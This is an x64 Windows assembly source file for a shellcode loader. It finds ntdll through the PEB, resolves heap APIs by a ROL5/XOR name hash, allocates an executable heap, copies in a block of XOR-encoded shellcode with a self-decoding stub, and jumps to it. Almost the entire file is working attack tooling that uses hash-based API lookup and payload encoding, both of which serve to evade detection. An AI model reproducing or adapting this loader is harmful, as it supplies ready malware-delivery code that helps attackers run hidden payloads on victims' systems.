;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -N -o x64findkernel32.exe x64findkernel32.obj
; externs: ld -m i386pep -LC:\mingw64\x86_64-w64-mingw32\lib asmsock.obj -o asmsock.exe -lws2_32 -lkernel32
;https://github.com/brechtsanders/winlibs_mingw/releases/download/14.2.0posix-19.1.1-12.0.0-ucrt-r2/winlibs-x86_64-posix-seh-gcc-14.2.0-llvm-19.1.1-mingw-w64ucrt-12.0.0-r2.zip

BITS 64

section .shellstuff rdata read
encoded_shellcode:
db 0x48, 0x8d, 0x35, 0x23, 0x00, 0x00, 0x00, 0x44, 0x8a, 0x0d, 0xb5, 0x01, 0x00, 0x00, 0xb9, 0xd0, 0x01, 0x00, 0x00, 0x8a, 0x06, 0x44, 0x30, 0xc8, 0xf6, 0xd0, 0x88, 0x06, 0x48, 0xff, 0xc6, 0xe2, 0xf2, 0x48, 0x8d, 0x05, 0x02, 0x00, 0x00, 0x00, 0xff, 0xe0, 0xaf, 0x1b, 0xd0, 0xb7, 0xa3, 0xbb, 0x93, 0x53, 0x53, 0x53, 0x12, 0x02, 0x12, 0x03, 0x01, 0x02, 0x05, 0x1b, 0x62, 0x81, 0x36, 0x1b, 0xd8, 0x01, 0x33, 0x1b, 0xd8, 0x01, 0x4b, 0x1b, 0xd8, 0x01, 0x73, 0x1b, 0xd8, 0x21, 0x03, 0x1b, 0x5c, 0xe4, 0x19, 0x19, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x6f, 0x32, 0x2f, 0x51, 0x7f, 0x73, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0xb1, 0xbe, 0x01, 0x12, 0x02, 0x1b, 0xd8, 0x01, 0x73, 0xd8, 0x11, 0x6f, 0x1b, 0x52, 0x83, 0xd8, 0xd3, 0xdb, 0x53, 0x53, 0x53, 0x1b, 0xd6, 0x93, 0x27, 0x34, 0x1b, 0x52, 0x83, 0x03, 0xd8, 0x1b, 0x4b, 0x17, 0xd8, 0x13, 0x73, 0x1a, 0x52, 0x83, 0xb0, 0x05, 0x1b, 0xac, 0x9a, 0x12, 0xd8, 0x67, 0xdb, 0x1b, 0x52, 0x85, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0x6b, 0xb3, 0x26, 0xa2, 0x1f, 0x50, 0x1f, 0x77, 0x5b, 0x16, 0x6a, 0x82, 0x26, 0x8b, 0x0b, 0x17, 0xd8, 0x13, 0x77, 0x1a, 0x52, 0x83, 0x35, 0x12, 0xd8, 0x5f, 0x1b, 0x17, 0xd8, 0x13, 0x4f, 0x1a, 0x52, 0x83, 0x12, 0xd8, 0x57, 0xdb, 0x1b, 0x52, 0x83, 0x12, 0x0b, 0x12, 0x0b, 0x0d, 0x0a, 0x09, 0x12, 0x0b, 0x12, 0x0a, 0x12, 0x09, 0x1b, 0xd0, 0xbf, 0x73, 0x12, 0x01, 0xac, 0xb3, 0x0b, 0x12, 0x0a, 0x09, 0x1b, 0xd8, 0x41, 0xba, 0x04, 0xac, 0xac, 0xac, 0x0e, 0x1a, 0xed, 0x24, 0x20, 0x61, 0x0c, 0x60, 0x61, 0x53, 0x53, 0x12, 0x05, 0x1a, 0xda, 0xb5, 0x1b, 0xd2, 0xbf, 0xf3, 0x52, 0x53, 0x53, 0x1a,0xda, 0xb6, 0x1a, 0xef, 0x51, 0x53, 0x70, 0x7a, 0x2c, 0x53, 0x53, 0x52, 0x12, 0x07, 0x1a, 0xda, 0xb7, 0x1f, 0xda, 0xa2, 0x12, 0xe9, 0x1f, 0x24, 0x75, 0x54, 0xac, 0x86, 0x1f, 0xda, 0xb9, 0x3b, 0x52, 0x52, 0x53, 0x53, 0x0a, 0x12, 0xe9, 0x7a, 0xd3, 0x38, 0x53, 0xac, 0x86, 0x03, 0x03, 0x1e, 0x62, 0x9a, 0x1e, 0x62, 0x93, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x91, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x92, 0x12, 0xe9, 0xb9, 0x5c, 0x8c, 0xb3, 0xac, 0x86, 0x1b, 0xda, 0x94, 0x39, 0x43, 0x12, 0x0b, 0x1f, 0xda, 0xb1, 0x1b, 0xda, 0xaa, 0x12, 0xe9, 0xca, 0xf6, 0x27, 0x32, 0xac, 0x86, 0x1b, 0xd2, 0x97, 0x13, 0x51, 0x53, 0x53, 0x1a, 0xeb, 0x30, 0x3e, 0x37, 0x53, 0x53, 0x53, 0x53, 0x53, 0x12, 0x03, 0x12, 0x03, 0x1b, 0xda, 0xb1, 0x04, 0x04,0x04, 0x1e, 0x62, 0x93, 0x39, 0x5e, 0x0a, 0x12, 0x03, 0xb1, 0xaf, 0x35, 0x94, 0x17, 0x77, 0x07, 0x52, 0x52, 0x1b, 0xde, 0x17, 0x77, 0x4b, 0x95, 0x53, 0x3b, 0x1b, 0xda, 0xb5, 0x05, 0x03, 0x12, 0x03, 0x12, 0x03, 0x12, 0x03, 0x1a, 0xac, 0x93, 0x12, 0x03, 0x1a, 0xac, 0x9b, 0x1e, 0xda, 0x92, 0x1f, 0xda, 0x92, 0x12, 0xe9, 0x2a, 0x9f, 0x6c, 0xd5, 0xac, 0x86, 0x1b, 0x62, 0x81, 0x1b, 0xac, 0x99, 0xd8, 0x5d, 0x12, 0xe9, 0x5b, 0xd4, 0x4e, 0x33, 0xac, 0x86, 0xe8, 0xa3, 0xe6, 0xf1, 0x05, 0x12, 0xe9, 0xf5, 0xc6, 0xee, 0xce, 0xac, 0x86, 0x1b, 0xd0, 0x97, 0x7b, 0x6f, 0x55, 0x2f, 0x59, 0xd3, 0xa8, 0xb3, 0x26, 0x56, 0xe8, 0x14, 0x40, 0x21, 0x3c, 0x39, 0x53, 0x0a, 0x12, 0xda, 0x89, 0xac, 0x86, 0x53, 0x53, 0x53, 0x53
encoded_shellcode_total equ $ - encoded_shellcode

section .data 

section .text
global main

main:

sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
	
xor rcx, rcx             ; RCX = 0

; Access TEB base: GS segment points to TEB
mov rax, gs:[0x30]
; Access PEB from TEB (TEB + 0x60)
mov rax, [rax + 0x60]

;mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr (_PEB_LDR_DATA)
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList

checkit:
mov rsi, [rsi] 
mov rcx, [rsi + 0x60] 

mov rbx, [rcx]
mov rdx, 0x6C00640074006E ;UNICODE "N T D L" from NTDLL.DLL
cmp rbx, rdx
jz foundit
jnz checkit

foundit:
mov rbx, [rsi + 0x30]

mov r8, rbx              ; mov NTDLL.dll base addr into r8

;=================================================================	
;Code for parsing Export Address Table
;=================================================================
mov ebx, [rbx+0x3C]           ; Get PE header offset (e_lfanew) from DOS header
add rbx, r8                   ; Add PE header offset to NTDLL base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88, avoids nulls!
mov edx, [rbx+rcx]            ; EDX = [PE Header + 0x88] = Export Directory RVA
add rdx, r8                   ; RDX = NTDLL.dll base + Export Directory RVA = Export Directory Address
mov r10d, [rdx+0x14]          ; R10D = NumberOfNames from Export Directory
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; R11D = AddressOfNames RVA
add r11, r8                   ; R11 = AddressOfNames VMA (Virtual Memory Address)
mov r13, r11                  ; Save AddressOfNames pointer in R13 for later name array indexing
mov rcx, r10                  ; Set RCX as countdown loop counter (will decrement through names)

;**********************************************************************
; Now, we start cycling through all the API functions
; Starting with Z and working our way to A
; While that's happening, we hash each API with our hashing routine (ROT left 5 + XOR)
; And compare the hashed value with our predetermined hash values and see if there's a match!
;**********************************************************************

ntdllfindfunction:             ; Loop over Export Address Table to find matching WinApi by hash
    jecxz FunctionNameNotFound    ; If RCX = 0, we've checked all names without a match
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA of function name at current index (RCX), R11 points to AddressOfNames array
	                              ; The index calculation [r11+rcx*4] multiplies by 4 because each RVA is a DWORD (4 bytes)
    add rbx, r8                   ; RBX = Function name VMA (add NTDLL base address to RVA)
    dec rcx                       ; Decrement loop counter (searching backwards through names array)
    jmp hashinitiator             ; Jump to hash this function name and compare
FunctionNameNotFound:
    jmp continuation              ; No matching function found, continue execution
FunctionNameFound:                ; Get function address from AddressOfFunctions
   ; ECX currently holds the name index (after dec in loop)
   ; Need to get the ordinal from AddressOfNameOrdinals
   mov rdi, rcx                   ; SAVE the loop counter!
   xor r11, r11
   mov r11d, [rdx+0x24]           ; AddressOfNameOrdinals RVA
   add r11, r8                    ; AddressOfNameOrdinals VMA
   
   inc ecx                        ; Adjust for the dec in loop
   movzx ecx, word [r11+rcx*2]    ; Get ordinal (WORD sized!) from ordinals array
   
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA
   mov r15d, [r11+rcx*4]          ; Use ordinal as index into functions
   add r15, r8                    ; Function address
   push r15                       ; Push the API we found to the stack for retrieval later.  We do this for all of them
   mov rcx, rdi                        ; RESTORE the original loop counter
   mov r11, r13                   ; Restore AddressOfNames pointer
   dec rcx                        ; Continue counting down
   jmp ntdllfindfunction

   ;********************************************************
   ; This is our hashing routine where we check if our hash
   ; matches the hash of the current API function
   ;********************************************************

   hashinitiator:
       xor eax, eax
       mov rsi, rbx        ; API name
       xor rbx, rbx
   next_char:
       mov bl, [rsi]       ; load next char
       test bl, bl
       jz check_hash
       rol eax, 5          ; rotate hash left 5 bits
       xor eax, ebx        ; hash ^= char
       inc rsi
       jmp next_char

   ;********************************************************
   ; This is where we check the hash generated and stored in the EAX register
   ; with all of our pretermined hash values
   ; if there's a match that's found, we jump to FunctionNameFound
   ; and save the hash by pushing it to the stack
   ;********************************************************

   check_hash:
   cmp eax, 0xb5cd8965                ; rtlcreateheap - Compare all bytes of eax with our pretermined hash values
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x4f48603e                ; rtlallocateheap
   je FunctionNameFound               ; If match, function found
   
   jmp ntdllfindfunction
   
continuation:

   ;********************************************************
   ; CONGRATS!  you found all the hashes, let's continue
   ;******************************************************** 	
	
	mov r14, [rsp + 0x8]      ;HeapCreate API location on stack
	mov r12, [rsp]            ;HeapAlloc API location on stack
	; execute resolved APIs
    
	xor     r9d, r9d          ; CommitSize  = 0 (let system decide)
    mov     r8d, 0x100000     ; ReserveSize = 1 MB (or any non-zero value)
    xor     edx, edx          ; HeapBase    = NULL (let system choose)
    mov     ecx, 0x00040002   ; Flags = The numeric values for these heap flags are: HEAP_GROWABLE = 0x00000002 and HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
                              ; So when you OR them together: HEAP_GROWABLE | HEAP_CREATE_ENABLE_EXECUTE = 0x00040002
                          
    call    r14               ; RtlCreateHeap

	xor rcx, rcx
	
	mov         r8, encoded_shellcode_total ;size of shellcode
	mov         edx, 8 
	mov         rcx, rax                    ;qword [rsp - 72]  
	call        r12                         ;halloc
	push rax
	pop rdx ; memory address of mapped region of memory
	
	lea rsi, [rel encoded_shellcode]
	mov ecx, encoded_shellcode_total
	mov r14, rdx ; save for later
	xor rax, rax
	
chunk_reader:
    
    mov al, byte [rsi]
	mov [rdx], al
    inc rsi
	test rcx, rcx
	jz final
	inc rdx
    loop chunk_reader
    
final:
jmp r14